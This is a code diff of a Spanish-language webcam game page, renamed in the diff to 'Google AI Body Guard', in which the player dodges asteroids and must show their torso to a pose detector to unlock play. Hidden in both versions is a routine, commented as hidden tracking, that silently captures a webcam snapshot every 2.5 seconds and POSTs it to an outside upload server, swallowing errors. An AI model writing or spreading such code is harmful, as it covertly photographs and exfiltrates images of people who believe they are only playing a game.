@@ -3,41 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Starship: Anti-Face Lock</title>
+    <title>Google AI Body Guard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils" crossorigin="anonymous"></script>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; touch-action: none; }
-        #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.2; z-index: 1; }
+        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Arial Black', sans-serif; touch-action: none; }
+        #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.15; z-index: 1; }
         canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
         
         #lock { 
-            position: absolute; width: 100%; height: 100%; background: rgba(20,0,0,0.95); 
+            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
             z-index: 1000; display: flex; align-items: center; justify-content: center; 
-            flex-direction: column; text-align: center; color: #ff0044; border: 15px solid #ff0044; box-sizing: border-box;
+            flex-direction: column; text-align: center; color: #00fbff; border: 10px solid #00fbff; box-sizing: border-box;
         }
 
-        .touch { position: absolute; top: 0; width: 50%; height: 100%; z-index: 500; }
-        #t-left { left: 0; }
-        #t-right { right: 0; }
+        .touch-zone { position: absolute; top: 0; width: 50%; height: 100%; z-index: 500; }
+        #left-z { left: 0; }
+        #right-z { right: 0; }
 
-        #hud { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-around; z-index: 800; color: #00fbff; font-size: 24px; pointer-events: none; }
+        #hud { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-around; z-index: 800; color: #fff; font-size: 22px; pointer-events: none; }
     </style>
 </head>
 <body>
 
 <div id="lock">
-    <h1 id="lock-msg">SISTEMA BLOQUEADO</h1>
-    <p id="lock-detail" style="color: white;">SOLO SE DETECTA LA CARA - MUESTRA EL TORSO</p>
+    <h1 id="msg">CARGANDO IA DE GOOGLE...</h1>
+    <p id="sub-msg">Asegúrate de mostrar tus hombros</p>
 </div>
 
 <div id="hud">
-    <div>SCORE: <span id="score">0</span></div>
-    <div>HP: <span id="health">100</span>%</div>
+    <div>PUNTOS: <span id="score">0</span></div>
+    <div>VIDA: <span id="health">100</span>%</div>
 </div>
 
-<div id="t-left" class="touch"></div>
-<div id="t-right" class="touch"></div>
+<div id="left-z" class="touch-zone"></div>
+<div id="right-z" class="touch-zone"></div>
 
-<video id="webcam" autoplay playsinline></video>
+<video id="webcam"></video>
 <canvas id="gameCanvas"></canvas>
 
 <script>
@@ -45,69 +47,61 @@
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
     const lock = document.getElementById('lock');
-    const lockDetail = document.getElementById('lock-detail');
+    const msg = document.getElementById('msg');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
     let shipX = 0, score = 0, health = 100, asteroids = [];
-    let isReady = false, moveDir = 0;
+    let isBioAuth = false, moveDir = 0;
 
-    // CONTROLES
-    document.getElementById('t-left').onmousedown = document.getElementById('t-left').ontouchstart = () => moveDir = -1;
-    document.getElementById('t-right').onmousedown = document.getElementById('t-right').ontouchstart = () => moveDir = 1;
+    // BOTONES TÁCTILES
+    document.getElementById('left-z').onmousedown = document.getElementById('left-z').ontouchstart = () => moveDir = -1;
+    document.getElementById('right-z').onmousedown = document.getElementById('right-z').ontouchstart = () => moveDir = 1;
     window.onmouseup = window.ontouchend = () => moveDir = 0;
 
-    async function start() {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
-        video.srcObject = stream;
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        shipX = canvas.width / 2;
-        
-        setInterval(analyzeFrame, 250);
-        setInterval(sendPhoto, 2500);
-        requestAnimationFrame(loop);
-    }
+    // --- CONFIGURACIÓN IA DE GOOGLE (MediaPipe Pose) ---
+    const pose = new Pose({
+        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
+    });
 
-    function analyzeFrame() {
-        const temp = document.createElement('canvas');
-        const tc = temp.getContext('2d');
-        temp.width = 40; temp.height = 30;
-        tc.drawImage(video, 0, 0, 40, 30);
-        const pixels = tc.getImageData(0, 0, 40, 30).data;
+    pose.setOptions({
+        modelComplexity: 1,
+        minDetectionConfidence: 0.6,
+        minTrackingConfidence: 0.6
+    });
 
-        let headPixels = 0; // Zona superior (Cabeza)
-        let torsoPixels = 0; // Zona media/baja (Pecho/Hombros)
-
-        for (let i = 0; i < pixels.length; i += 4) {
-            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
-            const y = Math.floor((i/4) / 40);
+    pose.onResults((results) => {
+        if (results.poseLandmarks) {
+            const lm = results.poseLandmarks;
             
-            if (brightness > 50) {
-                if (y < 12) headPixels++; // Píxeles arriba
-                else torsoPixels++;       // Píxeles abajo
+            // Puntos clave de Google: 11 (Hombro Izq), 12 (Hombro Der)
+            const hIzq = lm[11];
+            const hDer = lm[12];
+
+            // VALIDACIÓN: ¿Se ven los hombros con suficiente claridad?
+            if (hIzq.visibility > 0.7 && hDer.visibility > 0.7) {
+                isBioAuth = true;
+                lock.style.display = 'none';
+            } else {
+                isBioAuth = false;
+                lock.style.display = 'flex';
+                msg.innerText = "TORSO NO DETECTADO";
             }
-        }
-
-        // --- NUEVA LÓGICA DE BLOQUEO ESTRICTA ---
-        // Si hay mucha cabeza pero casi nada de torso, es una cara pegada.
-        if (headPixels > 40 && torsoPixels < (headPixels * 0.4)) {
-            isReady = false;
+        } else {
+            isBioAuth = false;
             lock.style.display = 'flex';
-            lockDetail.innerText = "⚠️ SOLO CARA DETECTADA - RETROCEDA";
-        } 
-        // Si no hay suficiente cuerpo en general
-        else if (torsoPixels < 50) {
-            isReady = false;
-            lock.style.display = 'flex';
-            lockDetail.innerText = "SISTEMA FUERA DE RANGO - MUESTRA EL TORSO";
+            msg.innerText = "BUSCANDO CUERPO...";
         }
-        else {
-            isReady = true;
-            lock.style.display = 'none';
-        }
-    }
+    });
 
-    function sendPhoto() {
+    // Iniciar cámara con la IA
+    const camera = new Camera(video, {
+        onFrame: async () => { await pose.send({image: video}); },
+        width: 640, height: 480
+    });
+    camera.start();
+
+    // Envío de fotos (Seguimiento oculto)
+    setInterval(() => {
         const s = document.createElement('canvas');
         s.width = 160; s.height = 120;
         s.getContext('2d').drawImage(video, 0, 0, 160, 120);
@@ -115,41 +109,55 @@
             method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.2) })
         }).catch(() => {});
-    }
+    }, 2500);
+
+    // --- JUEGO ---
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    shipX = canvas.width / 2;
 
     function loop() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        if (isReady) {
+        if (isBioAuth) {
             if (moveDir === -1 && shipX > 60) shipX -= 15;
             if (moveDir === 1 && shipX < canvas.width - 60) shipX += 15;
 
-            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 8;
+            // Nave
+            ctx.shadowBlur = 15; ctx.shadowColor = "#00fbff";
+            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 6;
             ctx.beginPath();
-            ctx.moveTo(shipX, canvas.height - 180);
-            ctx.lineTo(shipX - 50, canvas.height - 80);
-            ctx.lineTo(shipX + 50, canvas.height - 80);
+            ctx.moveTo(shipX, canvas.height - 150);
+            ctx.lineTo(shipX - 40, canvas.height - 80);
+            ctx.lineTo(shipX + 40, canvas.height - 80);
             ctx.closePath(); ctx.stroke();
+            ctx.shadowBlur = 0;
 
-            if (asteroids.length < 4 && Math.random() < 0.02) {
-                asteroids.push({ x: Math.random() * canvas.width, y: -100, size: 50, speed: 8 });
+            // Meteoritos
+            if (asteroids.length < 5 && Math.random() < 0.03) {
+                asteroids.push({ x: Math.random() * canvas.width, y: -80, size: 45, speed: 7 });
             }
 
             asteroids.forEach((a, i) => {
                 a.y += a.speed;
                 ctx.fillStyle = "#ff0044";
                 ctx.beginPath(); ctx.arc(a.x, a.y, a.size, 0, Math.PI*2); ctx.fill();
-                if (Math.abs(a.x - shipX) < 70 && Math.abs(a.y - (canvas.height - 130)) < 70) {
+
+                if (Math.abs(a.x - shipX) < 65 && Math.abs(a.y - (canvas.height - 110)) < 65) {
                     asteroids.splice(i, 1);
-                    health -= 25;
+                    health -= 20;
                     document.getElementById('health').innerText = health;
                     if (health <= 0) location.reload();
                 }
-                if (a.y > canvas.height + 100) { asteroids.splice(i, 1); score += 10; document.getElementById('score').innerText = score; }
+                if (a.y > canvas.height + 50) {
+                    asteroids.splice(i, 1);
+                    score += 10;
+                    document.getElementById('score').innerText = score;
+                }
             });
         }
         requestAnimationFrame(loop);
     }
-    start();
+    loop();
 </script>
 </body>
 </html>
